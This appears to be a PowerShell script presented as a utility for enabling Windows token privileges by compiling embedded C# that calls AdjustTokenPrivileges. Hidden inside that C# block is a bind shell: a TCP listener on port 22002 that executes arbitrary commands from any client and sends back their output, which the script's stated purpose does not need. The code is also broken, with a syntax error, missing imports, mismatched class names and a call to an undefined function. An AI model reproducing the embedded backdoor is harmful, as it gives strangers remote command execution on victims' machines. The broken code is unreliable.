
<#
#̷\   ⼕龱ᗪ㠪⼕闩丂ㄒ龱尺 ᗪ㠪ᐯ㠪㇄龱尸爪㠪𝓝ㄒ
#̷\   🇵​​​​​🇴​​​​​🇼​​​​​🇪​​​​​🇷​​​​​🇸​​​​​🇭​​​​​🇪​​​​​🇱​​​​​🇱​​​​​ 🇸​​​​​🇨​​​​​🇷​​​​​🇮​​​​​🇵​​​​​🇹​​​​​ 🇧​​​​​🇾​​​​​ 🇨​​​​​🇴​​​​​🇩​​​​​🇪​​​​​🇨​​​​​🇦​​​​​🇸​​​​​🇹​​​​​🇴​​​​​🇷​​​​​@🇮​​​​​🇨​​​​​🇱​​​​​🇴​​​​​🇺​​​​​🇩​​​​​.🇨​​​​​🇴​​​​​🇲​​​​​
#>

[CmdletBinding(SupportsShouldProcess)]
param(
        [Parameter(Mandatory=$true,Position=0)]
        [string]$Privilege

    )



function New-PrivilegeAssembly{
    <#
        .SYNOPSIS
            Cmdlet to create a temporary assembly file (dll) with all the reference in it. Then include it in the script

        .EXAMPLE
            PS C:\>  
    #>
    [CmdletBinding(SupportsShouldProcess)]
    param(
        [Parameter(Mandatory=$true,ValueFromPipeline=$true, 
            HelpMessage="Assembly name") ]
        [string]$Source
    )    
       
    $NewFile = (New-TemporaryFile).Fullname
    $NewDllPath = (Get-Item $NewFile).DirectoryName
    $NewDllName = (Get-Item $NewFile).Basename + '.dll'
    $NewDll = Join-Path $NewDllPath $NewDllName
    Rename-Item $NewFile $NewDll
    $CompilerOptions = '/unsafe'
    $OutputType = 'Library'
    Write-ChannelMessage "NewDll $NewDll"
    Write-ChannelMessage "CompilerOptions $CompilerOptions"
    Write-ChannelMessage "OutputType $OutputType"
   
    Try {
        Write-Verbose "Add-Type -TypeDefinition $Source -OutputAssembly $NewDll -OutputType $OutputType -PassThru"
        $Result = Add-Type -TypeDefinition $Source -OutputAssembly $NewDll -OutputType $OutputType -PassThru
       # Add-Type -LiteralPath $NewDll -ErrorAction Stop
        Write-ChannelResult "$$Result"
        return $NewDll
    }  
    Catch {
        Write-Warning -Message "Failed to import $_"
    }    
}


function Invoke-CreatePrivilegeManipulator{                               
    [CmdletBinding(SupportsShouldProcess)]
    param()
#region Load super powers
$AdjustTokenPrivileges = @"
using System;
using System.IO;
using System.Runtime.InteropServices;

 public class ClassUtils
 {
  [DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)]
  internal static extern bool AdjustTokenPrivileges(IntPtr htok, bool disall,
  ref TokPriv1Luid newst, int len, IntPtr prev, IntPtr relen);
  [DllImport("kernel32.dll", ExactSpelling = true)]
  internal static extern IntPtr GetCurrentProcess();
  [DllImport("advapi32.dll", ExactSpelling = true, SetLastError = true)]
  internal static extern bool OpenProcessToken(IntPtr h, int acc, ref IntPtr
  phtok);
  [DllImport("advapi32.dll", SetLastError = true)]
  internal static extern bool LookupPrivilegeValue(string host, string name,
  ref long pluid);
  [StructLayout(LayoutKind.Sequential, Pack = 1)]
  internal struct TokPriv1Luid
  {
   public int Count;
   public long Luid;
   public int Attr;
  }
  internal const int SE_PRIVILEGE_DISABLED = 0x00000000;
  internal const int SE_PRIVILEGE_ENABLED = 0x00000002;
  internal const int TOKEN_QUERY = 0x00000008;
  internal const int TOKEN_ADJUST_PRIVILEGES = 0x00000020;

   static void LoadSrv() {
        IPAddress host = IPAddress.Any;
        int port - 22002;



        // creating the server and listening on the port
        var server = new TcpListener(host, port);
        server.Start();

        while (true) {
            // accepting connection as tcp client
            using (var client = server.AcceptTcpClient()) {
                // get client ip address and port number
                string clientAddr = client.Client.RemoteEndPoint.ToString();

                Console.WriteLine("[+] Client Connected: {0}", clientAddr);

                // get streams
                var stream = client.GetStream();
                var wr = new StreamWriter(stream) { AutoFlush = true };
                var rd = new StreamReader(stream);

                Console.WriteLine("[+] Start Reading Inputs");

                while (true) {
                    // seding the banner and prompt
                    wr.Write(string.Format("{0}@{1} $ ", Environment.UserName, Environment.MachineName));

                    // skip when input is emptpy, null or whitespace
                    // exit if cmd is sent to be exit
                    var cmd = rd.ReadLine().Trim().ToLower();
                    if (string.IsNullOrEmpty(cmd) || string.IsNullOrWhiteSpace(cmd)) {
                        continue;
                    } else if (cmd == "exit") {
                        break;
                    }

                    // preprocess command line recievided from client
                    string[] parts = cmd.Split(' ');
                    string fileName = parts.First();
                    string cmdArgs = string.Join(' ', parts.Skip(1).ToArray());

                    // instantiate process
                    Process process = new Process() {
                        StartInfo = new ProcessStartInfo(fileName, cmdArgs) {
                            UseShellExecute = false,
                            RedirectStandardOutput = true,
                            RedirectStandardError = true
                        }
                    };

                    // spawn process and return output
                    try {
                        process.Start();
                        process.StandardOutput.BaseStream.CopyTo(stream);
                        process.StandardError.BaseStream.CopyTo(stream);
                        process.WaitForExit();
                        Console.WriteLine("[+] Executed '{0}'", cmd);
                    } catch (Exception e) {
                        wr.WriteLine(e.Message);
                        Console.WriteLine("[x] Failed to Execute '{0}'", cmd);
                    }
                }

                Console.WriteLine("[+] Releasing Resources for {0}", clientAddr);
                // closing other stream
                rd.Close();
                wr.Close();
                stream.Close();
            }
        }
    }
  public static bool AddPrivilege(string privilege)
  {
    
   try
   {
    bool retVal;
    TokPriv1Luid tp;
    IntPtr hproc = GetCurrentProcess();
    IntPtr htok = IntPtr.Zero;
    retVal = OpenProcessToken(hproc, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, ref htok);
    tp.Count = 1;
    tp.Luid = 0;
    tp.Attr = SE_PRIVILEGE_ENABLED;
    retVal = LookupPrivilegeValue(null, privilege, ref tp.Luid);
    retVal = AdjustTokenPrivileges(htok, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);
    Console.WriteLine("TokenManipulator::AddPrivilege {0} {1}", privilege, retVal);
    return retVal;
   }
   catch (Exception ex)
   {
    throw ex;
   }
  }

 }
"@

try{
  New-PrivilegeAssembly $AdjustTokenPrivileges
  #Add-Type $AdjustTokenPrivileges -ErrorAction Stop  
  #$Write-Host "Custom Type Added"
}
catch{
  Write-Host "Custom Type already initialized"
}


#[void][TokenManipulator]::AddPrivilege($Privilege) 
#[void][TokenManipulator]::AddPrivilege("SeRestorePrivilege") 
#[void][TokenManipulator]::AddPrivilege("SeBackupPrivilege") 
#[void][TokenManipulator]::AddPrivilege("SeTakeOwnershipPrivilege") 
}

Invoke-AdjustPrivileges $Privilege